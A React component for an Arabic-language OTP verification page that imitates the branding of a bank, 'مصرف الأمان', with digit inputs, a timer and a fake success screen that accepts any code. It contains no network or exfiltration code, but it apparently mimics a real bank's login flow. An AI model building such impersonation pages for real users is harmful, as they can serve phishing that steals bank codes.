import { useState, useEffect, useRef } from "react";
import { useLocation } from "wouter";
import { ArrowRight } from "lucide-react";

const BANK_BLUE = "#1a3a7a";

function FieldError({ msg }: { msg: string }) {
  return (
    <p className="text-xs mt-1 text-center" style={{ color: "#dc2626" }}>
      {msg}
    </p>
  );
}

export default function OtpPage() {
  const [, navigate] = useLocation();
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [timeLeft, setTimeLeft] = useState(120);
  const [verified, setVerified] = useState(false);
  const [error, setError] = useState("");
  const [submitted, setSubmitted] = useState(false);
  const inputRefs = useRef<(HTMLInputElement | null)[]>([]);

  useEffect(() => {
    if (timeLeft <= 0) return;
    const timer = setInterval(() => setTimeLeft(t => t - 1), 1000);
    return () => clearInterval(timer);
  }, [timeLeft]);

  const formatTime = (s: number) => `${Math.floor(s / 60)}:${(s % 60).toString().padStart(2, "0")}`;

  const handleChange = (index: number, value: string) => {
    if (!/^\d*$/.test(value)) return;
    const newOtp = [...otp];
    newOtp[index] = value.slice(-1);
    setOtp(newOtp);
    if (submitted) setError(newOtp.every(d => d !== "") ? "" : "أدخل الرمز المكون من 6 أرقام");
    if (value && index < 5) inputRefs.current[index + 1]?.focus();
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === "Backspace" && !otp[index] && index > 0)
      inputRefs.current[index - 1]?.focus();
  };

  const handleVerify = (e: React.FormEvent) => {
    e.preventDefault();
    setSubmitted(true);
    if (timeLeft <= 0) {
      setError("انتهت مدة الرمز. اضغط على إعادة الإرسال");
      return;
    }
    if (!otp.every(d => d !== "")) {
      setError("أدخل الرمز المكون من 6 أرقام");
      return;
    }
    setError("");
    setVerified(true);
    setTimeout(() => navigate("/"), 2000);
  };

  const isComplete = otp.every(d => d !== "");

  if (verified) {
    return (
      <div dir="rtl" className="min-h-screen flex flex-col items-center justify-center bg-white" style={{ fontFamily: "'Cairo', sans-serif" }}>
        <div
          className="w-20 h-20 rounded-full flex items-center justify-center text-3xl mb-4 shadow-lg text-white font-bold"
          style={{ background: `linear-gradient(135deg, ${BANK_BLUE}, #2855b0)` }}
        >
          ✓
        </div>
        <h2 className="text-xl font-bold mb-1" style={{ color: BANK_BLUE }}>تم التحقق بنجاح!</h2>
        <p className="text-gray-500 text-sm">جارٍ تسجيل الدخول...</p>
      </div>
    );
  }

  return (
    <div dir="rtl" className="min-h-screen bg-white" style={{ fontFamily: "'Cairo', sans-serif", maxWidth: 480, margin: "0 auto" }}>
      {/* Navbar */}
      <nav className="flex items-center justify-between px-4 py-3 bg-white border-b border-gray-100 shadow-sm">
        <button onClick={() => navigate(-1)} className="text-gray-600 p-1">
          <ArrowRight className="w-5 h-5" />
        </button>
        <div className="text-sm font-bold" style={{ color: BANK_BLUE }}>رمز التحقق</div>
        <img src="/aman-bank-logo.png" alt="مصرف الأمان" style={{ height: 36 }} />
      </nav>

      {/* Progress indicator */}
      <div className="px-5 pt-4 pb-2">
        <div className="flex items-center justify-center gap-2 mb-1">
          {["بياناتك", "تسجيل الدخول", "التحقق"].map((label, i) => (
            <div key={i} className="flex items-center gap-2">
              <div className="flex flex-col items-center gap-1">
                <div
                  className="w-7 h-7 rounded-full flex items-center justify-center text-xs font-bold"
                  style={{
                    background: i <= 2 ? BANK_BLUE : "#e2e8f0",
                    color: i <= 2 ? "white" : "#94a3b8",
                  }}
                >
                  {i < 2 ? "✓" : i + 1}
                </div>
                <span className="text-xs" style={{ color: i <= 2 ? BANK_BLUE : "#94a3b8", fontSize: 9 }}>
                  {label}
                </span>
              </div>
              {i < 2 && <div className="w-8 h-px mb-4" style={{ background: BANK_BLUE }} />}
            </div>
          ))}
        </div>
      </div>

      {/* Hero */}
      <div
        className="h-20 flex flex-col items-center justify-center"
        style={{ background: `linear-gradient(135deg, ${BANK_BLUE} 0%, #2855b0 100%)` }}
      >
        <p className="text-white font-bold text-base">رمز التحقق</p>
        <p className="text-blue-200 text-xs mt-1">أدخل الرمز المرسل إلى هاتفك</p>
      </div>

      <div className="px-5 pt-6 pb-6">
        <form onSubmit={handleVerify} noValidate>
          <p className="text-gray-600 text-sm text-right mb-5 leading-relaxed">
            أدخل رمز التأكيد المكون من 6 أرقام المرسل إلى هاتفك المحمول
          </p>

          {/* OTP inputs */}
          <div className="flex justify-center gap-2 mb-2 flex-row-reverse">
            {otp.map((digit, index) => (
              <input
                key={index}
                ref={el => { inputRefs.current[index] = el; }}
                type="text"
                inputMode="numeric"
                maxLength={1}
                value={digit}
                onChange={e => handleChange(index, e.target.value)}
                onKeyDown={e => handleKeyDown(index, e)}
                className="w-11 h-12 text-center text-lg font-bold rounded outline-none transition-all"
                style={{
                  background: digit ? BANK_BLUE : submitted && error ? "#fff0f0" : "#f0f4ff",
                  color: digit ? "white" : BANK_BLUE,
                  border: `2px solid ${digit ? BANK_BLUE : submitted && error ? "#dc2626" : "#d1d9f0"}`,
                }}
              />
            ))}
          </div>

          {error && <FieldError msg={error} />}

          {/* Timer row */}
          <div className="flex items-center justify-between mt-4 mb-6">
            <button
              type="button"
              disabled={timeLeft > 0}
              onClick={() => { setTimeLeft(120); setError(""); setSubmitted(false); }}
              className="text-sm font-semibold transition-all"
              style={{ color: timeLeft > 0 ? "#94a3b8" : BANK_BLUE, cursor: timeLeft > 0 ? "not-allowed" : "pointer" }}
            >
              إعادة الإرسال
            </button>
            <div
              className="font-mono font-bold text-sm px-3 py-1 rounded"
              style={{
                background: timeLeft > 30 ? "#f0f4ff" : timeLeft > 0 ? "#fff0f0" : "#fee2e2",
                color: timeLeft > 30 ? BANK_BLUE : "#dc2626",
                border: `1px solid ${timeLeft > 30 ? "#d1d9f0" : "#fca5a5"}`,
              }}
            >
              {timeLeft > 0 ? formatTime(timeLeft) : "انتهى الوقت"}
            </div>
          </div>

          {/* Expired notice */}
          {timeLeft <= 0 && (
            <div
              className="rounded-lg p-3 mb-4 text-right text-xs leading-relaxed"
              style={{ background: "#fff0f0", border: "1px solid #fca5a5", color: "#dc2626" }}
            >
              انتهت صلاحية الرمز. اضغط على "إعادة الإرسال" للحصول على رمز جديد.
            </div>
          )}

          {/* Security note */}
          <div
            className="rounded-lg p-3 mb-6 text-right"
            style={{ background: "#f0f7ff", border: "1px solid #c7d9f7" }}
          >
            <p className="text-xs text-gray-600 leading-relaxed">
              🔒 لا تشارك رمز التحقق مع أي شخص. مصرف الأمان لن يطلب منك هذا الرمز أبداً.
            </p>
          </div>

          {/* Confirm */}
          <div className="flex justify-center">
            <button
              type="submit"
              className="px-16 py-3 rounded font-bold text-sm transition-all"
              style={{
                background: isComplete && timeLeft > 0 ? BANK_BLUE : "#9eb0d4",
                color: "white",
                minWidth: 200,
                cursor: isComplete && timeLeft > 0 ? "pointer" : "not-allowed",
              }}
            >
              تأكيد
            </button>
          </div>
        </form>
      </div>

      {/* Footer */}
      <div className="px-5 py-3 text-center border-t border-gray-100">
        <p className="text-gray-400 text-xs">© 2019 مصرف الأمان — جميع الحقوق محفوظة</p>
      </div>
    </div>
  );
}
